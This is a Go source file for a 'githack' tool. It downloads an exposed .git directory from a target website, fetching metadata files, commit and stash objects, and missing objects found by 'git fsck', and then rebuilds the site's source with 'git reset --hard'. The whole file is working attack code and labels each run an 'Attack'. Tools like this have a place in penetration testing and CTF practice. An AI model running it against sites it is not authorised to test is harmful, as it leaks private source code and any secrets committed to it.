package githack

import (
	"bufio"
	"bytes"
	"context"
	"errors"
	"fmt"
	"io"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"

	"github.com/virzz/logger"
	"github.com/virzz/virzz/modules/downloader"
	"github.com/virzz/virzz/utils/execext"
)

var baseFiles = []string{
	".git/ORIG_HEAD",
	".git/config",
	".git/HEAD",
	".git/info/exclude",
	".git/logs/HEAD",
	".git/logs/refs/heads/master",
	".git/logs/refs/stash",
	".git/description",
	".git/hooks/commit-msg.sample",
	".git/hooks/pre-rebase.sample",
	".git/hooks/pre-commit.sample",
	".git/hooks/applypatch-msg.sample",
	".git/hooks/fsmonitor-watchman.sample",
	".git/hooks/pre-receive.sample",
	".git/hooks/prepare-commit-msg.sample",
	".git/hooks/post-update.sample",
	".git/hooks/pre-applypatch.sample",
	".git/hooks/pre-push.sample",
	".git/hooks/update.sample",
	".git/refs/heads/master",
	".git/refs/stash",
	".git/index",
	".git/COMMIT_EDITMSG",
}

func parserURL(targetURL string) (resURL, tempDir string, err error) {
	_url, err := url.Parse(targetURL)
	if err != nil {
		return
	}
	tempDir = _url.Host
	for _, bad := range []string{".", "/", "\\", "'", "\"", ":"} {
		tempDir = strings.ReplaceAll(tempDir, bad, "_")
	}
	err = os.Mkdir(tempDir, 0700)
	if err != nil && !os.IsExist(err) {
		return
	}
	resURL = strings.TrimRight(targetURL, ".git/")
	resURL = strings.TrimRight(resURL, "/")
	return resURL, tempDir, nil
}

func fetchObjects(downClient *downloader.Downloader, baseURL, tempDir string, stash bool) (err error) {
	var file *os.File
	if stash {
		if file, err = os.Open(filepath.Join(tempDir, ".git", "logs", "refs", "stash")); err != nil {
			return
		}
	} else {
		if file, err = os.Open(filepath.Join(tempDir, ".git", "logs", "refs", "heads", "master")); err != nil {
			return
		}
	}
	defer file.Close()
	br := bufio.NewReader(file)
	var (
		line    []byte
		hashArr []string
		curHash string
	)
	// download
	for {
		line, _, err = br.ReadLine()
		if err == io.EOF {
			break
		}
		hashArr = strings.Split(string(line), " ")
		if len(hashArr) < 3 {
			break
		}
		curHash = hashArr[1]
		target := filepath.Join(".git", "objects", curHash[:2], curHash[2:40])
		downClient.AddTask(fmt.Sprintf("%s/%s", baseURL, target), filepath.Join(tempDir, target))
	}
	return downClient.Start()
}
func fetchStashObjects(downClient *downloader.Downloader, baseURL, tempDir string) (err error) {
	return fetchObjects(downClient, baseURL, tempDir, true)
}
func fetchCommitObjects(downClient *downloader.Downloader, baseURL, tempDir string) (err error) {
	return fetchObjects(downClient, baseURL, tempDir, false)
}
func fixMissingObjects(downClient *downloader.Downloader, baseURL, tempDir string) (err error) {
	var (
		matches [][]string
		stdout  bytes.Buffer
	)
	opts := &execext.RunCommandOptions{
		Command: "git fsck 2>&1",
		Dir:     tempDir,
		Stdout:  &stdout,
	}
	if err = execext.RunCommand(context.Background(), opts); err != nil && !strings.Contains(err.Error(), "exit status") {
		return fmt.Errorf(`RunCommand "%s" failed: %s`, opts.Command, err)
	}
	logger.Debug("git fsck:", stdout.String())
	matches = regexp.MustCompile(`(?m)([a-fA-F0-9]{40})`).FindAllStringSubmatch(stdout.String(), -1)
	// matchMap := make(map[string]int)
	if len(matches) > 0 {
		for _, match := range matches {
			curHash := match[0]
			target := filepath.Join(".git", "objects", curHash[:2], curHash[2:40])
			logger.Info("Fetch Object", target)
			downClient.AddTask(fmt.Sprintf("%s/%s", baseURL, target), filepath.Join(tempDir, target))
		}
		downClient.Start()
	}
	if len(matches) > 0 {
		fixMissingObjects(downClient.Reset(), baseURL, tempDir)
	}
	return nil
}

func gitHack(targetURL string, limit, delay int64) (err error) {
	var baseURL, tempDir string
	logger.InfoF("Attack [%s]", targetURL)

	if baseURL, tempDir, err = parserURL(targetURL); err != nil {
		return
	}
	logger.Info("BaseURL:", baseURL)
	logger.Info("TempDir:", tempDir)

	download := downloader.NewDownloader().SetLimit(limit).SetDelay(delay).SetTimeout(timeout)

	logger.Info("Fetch Base Files...")
	for _, uri := range baseFiles {
		download.AddTask(fmt.Sprintf("%s/%s", baseURL, uri), filepath.Join(tempDir, uri))
	}
	if err = download.Start(); err != nil {
		if errors.Is(err, downloader.ErrInterrupt) {
			logger.Warn(err)
			return nil
		}
		return err
	}

	// Fetch Commit Objects
	logger.Info("Fetch Commit Objects...")
	err = fetchCommitObjects(download, baseURL, tempDir)
	if err != nil {
		if errors.Is(err, downloader.ErrInterrupt) {
			logger.Warn(err)
			return nil
		}
		return err
	}

	// Fetch Stash Objects
	logger.Info("Fetch Stash Objects...")
	err = fetchStashObjects(download, baseURL, tempDir)
	if errors.Is(err, downloader.ErrInterrupt) {
		logger.Warn(err)
		return nil
	}

	// Fix Missing Objects
	logger.Info("Fetch Missing Objects...")
	err = fixMissingObjects(download, baseURL, tempDir)
	if err != nil {

		if errors.Is(err, downloader.ErrInterrupt) {
			logger.Warn(err)
			return nil
		}
		return err
	}

	// Reset to the last commit
	logger.Info("Git Reset...")
	var stdout bytes.Buffer
	opts := &execext.RunCommandOptions{
		Command: "git reset --hard > /dev/null",
		Dir:     tempDir,
		Stdout:  &stdout,
	}
	if err = execext.RunCommand(context.Background(), opts); err != nil {
		return fmt.Errorf(`RunCommand "%s" failed: %s`, opts.Command, err)
	}
	logger.Debug(stdout.String())

	logger.Info("Fetched Info")
	return nil
}
